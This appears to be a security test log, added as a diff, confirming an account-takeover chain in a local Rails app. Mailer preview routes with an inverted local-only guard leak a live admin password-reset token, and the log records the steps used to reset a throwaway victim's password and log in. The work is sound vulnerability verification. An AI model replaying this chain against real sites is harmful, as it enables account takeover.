@@ -1,0 +1,31 @@
+========================================================================
+VULN-001: unauth mailer previews -> live reset-token leak -> account takeover
+target : http://localhost:27966
+========================================================================
+[INFO] exercising vulnerable code path: Rails::MailersController (inverted require_local! guard) + PasswordsMailerPreview#reset
+[STEP] Leg A: rendering the reset preview the route serves (PasswordsMailer.reset(User.take)) and resolving its token
+[INFO] @@legA token_present=true resolves_id=1 is_admin_take=true admin_email=admin@example.com
+[INFO] @@legB guard_line="before_action :require_local!, unless: :show_previews?"
+[INFO] @@legB show_previews_pred="ActionMailer::Base.show_previews"
+[INFO] @@legB routes_mounted_iff_show_previews=true
+[INFO] @@done
+[PROOF] the reset preview renders a LIVE password_reset_token that resolves to User.take = the admin (admin@example.com, id 1) — a 'preview' surface emits a live admin credential
+[PROOF] the require_local! guard is inverted (`unless: :show_previews?`) and the routes mount only when show_previews is true — so whenever the routes exist, the local-only guard is skipped (vestigial)
+[SETUP] Leg C: creating throwaway victim victim_8913ccd9@example.invalid (so the admin is left intact) and minting its reset token
+[INFO] leaked reset token for the victim (what the preview would expose): eyJfcmFpbHMiOnsiZGF0YSI6WzcsIkU2...
+[STEP] GET /passwords/<leaked-token>/edit (the token resolves to the victim; no prior auth)
+[INFO] edit page status = 200
+[STEP] PATCH /passwords/<leaked-token> with a NEW password (cookie + authenticity_token + Sec-Fetch-Site)
+[INFO] reset PATCH status = 302 location = https://localhost:27966/session/new
+[STEP] logging in as the victim with the attacker-chosen password
+[INFO] login status = 302 location = https://localhost:27966/
+[PROOF] the leaked reset token set a NEW password and the attacker logged in as victim_8913ccd9@example.invalid (302 -> https://localhost:27966/) — full account takeover from a single leaked reset token
+[SETUP] ENABLE_PREVIEWS=1: enabling config.action_mailer.show_previews in-container (will be reverted)
+[STEP] UNAUTH GET /rails/mailers/download/passwords_mailer/reset (no cookie, no auth)
+[INFO] unauth route status = 200; token extracted = True
+[INFO] @@r id=1 admin=true email=admin@example.com
+[PROOF] UNAUTHENTICATED GET of the preview .eml returned the admin's live password-reset token (resolves to admin@example.com) — broken access control confirmed over HTTP
+[SETUP] reverting: restoring production.rb and restarting (back to the secure baseline)
+[INFO] baseline restored: GET /rails/mailers -> 404 (expect 404)
+[OK] exploit confirmed — the reset preview leaks a LIVE admin reset token, the local-only guard is inverted (skipped exactly when the routes exist), and a leaked reset token yields full account takeover via the shipped unauthenticated reset controller + UNAUTH /rails/mailers route served the admin token
+==> VULN-001: CONFIRMED — CONFIRMED (live admin reset-token leak + inverted guard + leaked-token->ATO); unauthenticated /rails/mailers exposure requires config.action_mailer.show_previews=true
